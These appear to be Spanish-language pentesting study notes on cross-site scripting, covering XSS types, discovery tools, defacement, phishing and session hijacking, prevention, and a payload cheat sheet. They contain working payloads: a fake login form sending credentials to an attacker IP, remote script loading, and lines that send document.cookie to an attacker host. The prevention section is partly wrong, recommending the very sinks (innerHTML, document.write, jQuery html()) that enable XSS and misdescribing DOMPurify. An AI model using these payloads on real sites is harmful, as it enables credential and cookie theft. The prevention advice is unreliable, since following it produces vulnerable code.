#vuln #web 
El Cross-site Scripting es una vulnerabilidad en la que se permite ejecutar código [[Javascript]] con el que se puede atacar una página de diferentes formas.
Existe dos tipos de XSS:
#### Reflected
En peticiones GET o HEAD [[HTTP]] en la que se refleja el contenido de una búsqueda y se solicita un recurso a la web.
Una buena prueba de concepto para saber si una página es vulnerable a un XSS reflected es que cuente con un buscador o un código de mensaje en la URL explotable, es poner <script>alert()</script> que si funciona y es vulnerable debería saltar una alerta en la página con el contenido entre los paréntesis escrito. Sin embargo, aunque se pueda ejecutar código javascript puede tener limitaciones a la hora de hacer algún tipo de ataque.
Para poder explotar esta vulnerabilidad en una víctima los parámetros se pasan por la URL y se envía la URL completa a la víctima para que se ejecute el script.
#### Stored
En peticiones POST en la que el contenido se entrega a la página web y se almacena para hacer ataques como robos de [[Cookies]].
Para una prueba de concepto se realiza igual que en el reflected, solo que se pone el código javascript en un bloc de comentarios o dónde reciba la información de la petición POST.
Cuando el alert() no funciona, puede significar que la página no permite pop ups, por lo que otra buena práctica sería utilizar el siguiente payload:
<script>print()</script> que nos printeará la información que le metamos como una función de javasccript.

#### Dom-based
Se basa en enviar el contenido reflejado como en una reflected y enviarlo al back-end cambiando el page source mediante DOM(Document Object Model).
Al ejecutar alguna acción todo se procesa por el navegador, es decir, no se hacen peticiones y al recargar la página el código habrá vuelto a la normalidad. Además, los parámetros se añaden mediante un #.

Para entender mejor el DOM-based XSS debemos entender dos conceptos:
1. Source: es el objeto que coge el input del usuario. 
2. Sink: las funciones que se utilizan para escribir en DOM-Objects. Algunas utilizadas son:
	1. document.write()
	2. DOM.innerHTML
	3. DOM.outerHTML
	Algunas funciones de JQuery son:
	1. add()
	2. after()
	3. append()
Muchas de estas funciones no permiten el uso de la etiqueta <script></script> por lo que usaremos otras etiquetas.
El ejemplo más utilizado es un onerror attack:
<img src="" onerror="alert()">
Esta etiqueta lo que hace es introducir una imagen inválida y a la hora de intentar cargarla, al dar error, llegará al atributo onerror ejecutando lo que haya.

Descubrimiento de vulnerabilidades XSS:
Herramientas
	XSS Strike usage:
	python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
	Brute XSS
	XSSer

#### Descubrimiento Manual:
La mejor forma de encontrar una vulnerabilidad XSS es probar payloads y luego analizar el código o ver sus reacciones. Esto puede ser poco eficiente por lo que la creación de scripts propios nos puede ayudar con casos específicos para su descubrimiento. 
Una forma muy importante a la hora de analizar una vulnerabilidad XSS es el code review. Si entendemos como nuestro código está siendo almacenado, podemos encontrar formas de saltarnos los filtros o elegir un payload correctamente, por ejemplo en las DOM xss con el source y el sink. El descubrimiento manual de vulnerabilidades sirve para las páginas que han sido testeadas con herramientas automáticas 

#### Defacing web sites

Defacing es la acción de cambiar el estilo de la página con el objetivo de que se vea que ha sido hackeada. Esto se realiza ejecutando código XSS para cambiar algunos atributos, los más típicos son los siguientes:
- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`
##### Cambiar color de fondo

Para poder hacer esto tiene que ser una vulnerabilidad stored XSS y con payloads como el siguiente:
<script>document.body.style.background = "#141d2b"</script>
Para cambiar a una imagen predeterminada podríamos hacerlo de la siguiente forma:
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>

##### Cambiar el título de la página

Solo hay que modificar el atributo document.title como hemos estado haciendo con los otros como document.body.background o document.body.style.background:
<script>document.title = 'HackTheBox Academy'</script>

##### Cambiar el contenido de la página

Se trata de cambiar el atributo del texto de página:
document.getElementById("todo").innerHTML = "New Text"

También se pueden utilizar funciones de JQuery:
$("#todo").html('New Text');

Y para cambiar en lugar de todo el código html, solo el body:
document.getElementsByTagName('body')[0].innerHTML = "New Text"

En esta última elegimos el objeto body directamente y con el [0] especificamos que es el primer body que aparezca en la página.

#### Phishing with XSS

Primero de todo, hay que encontrar una vulnerabilidad XSS dónde poder inyectar nuestro código malicioso.

##### Login Form Injection

Una vez identificada la vulnerabilidad XSS podemos crear el ataque de phishing, por ejemplo creando un form falso. Un ejemplo de form falso sería el siguiente:

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

Dónde pone OUR_IP sería la IP a la que queremos que lleguen los contenidos del login.
Todo ese código se tiene que poner dentro de un document.write():
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.16.166:80><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script> <!--             -->


#### Session hijacking

Blind XSS

Las Blind XSS ocurren cuando una página es vulnerable a XSS y no podemos comprobarlo, esto nos lleva a dos preguntas, la página es realmente vulnerable y si lo es qué payload deberíamos utilizar para que funcione.

Primero de todo, para comprobar si es vulnerable o no podemos usar el siguiente payload:
```html
<script src="http://OUR_IP/username"></script>
```
Con el que recibiremos una petición a la IP que controlamos de forma inmediata. Si recibimos la petición, significará que el campo username es vulnerable.
Algunos parámetros comunes que es muy poco probable que sean vulnerables son el password, ya que normalmente están almacenados en forma de hash y los emails ya que el formato de email tiene que se correcto.
Para robar las cookies:
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

#### Prevention

##### Input validation

Establecer la entrada con una whitelist con los valores único que se pueden utilizar, por ejemplo esta función de javascript que permite solo direcciones de email válidas:
```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

##### Input sanitization

Comprobar que no nos introducen ningún script dónde no deberían, cómo este código que sustituye cualquier carácter especial con una / previniendo vulnerabilidades DOM XSS
```javascript
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
```

##### Direct input

Tenemos que tener en cuenta no utilizar nunca algunos tags directos:
1. JavaScript code `<script></script>`
2. CSS Style Code `<style></style>`
3. Tag/Attribute Fields `<div name='INPUT'></div>`
4. HTML Comments `<!-- -->`

Preferiblemente habría que usar funciones JavaScript:
- `DOM.innerHTML`
- `DOM.outerHTML`
- `document.write()`
- `document.writeln()`
- `document.domain`
Y funciones JQuery:
- `html()`
- `parseHTML()`
- `add()`
- `append()`
- `prepend()`
- `after()`
- `insertAfter()`
- `before()`
- `insertBefore()`
- `replaceAll()`
- `replaceWith()`

##### Server configuration

- Using HTTPS across the entire domain.
- Using XSS prevention headers.
- Using the appropriate Content-Type for the page, like `X-Content-Type-Options=nosniff`.
- Using `Content-Security-Policy` options, like `script-src 'self'`, which only allows locally hosted scripts.
- Using the `HttpOnly` and `Secure` cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.


#### CheatSheet:
|   |   |
|---|---|
|**XSS Payloads**||
|`<script>alert(window.origin)</script>`|Basic XSS Payload|
|`<plaintext>`|Basic XSS Payload|
|`<script>print()</script>`|Basic XSS Payload|
|`<img src="" onerror=alert(window.origin)>`|HTML-based XSS Payload|
|`<script>document.body.style.background = "#141d2b"</script>`|Change Background Color|
|`<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`|Change Background Image|
|`<script>document.title = 'HackTheBox Academy'</script>`|Change Website Title|
|`<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`|Overwrite website's main body|
|`<script>document.getElementById('urlform').remove();</script>`|Remove certain HTML element|
|`<script src="http://OUR_IP/script.js"></script>`|Load remote script|
|`<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`|Send Cookie details to us|
|**Commands**||
|`python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`|Run `xsstrike` on a url parameter|
|`sudo nc -lvnp 80`|Start `netcat` listener|
|`sudo php -S 0.0.0.0:80`|Start `PHP` server|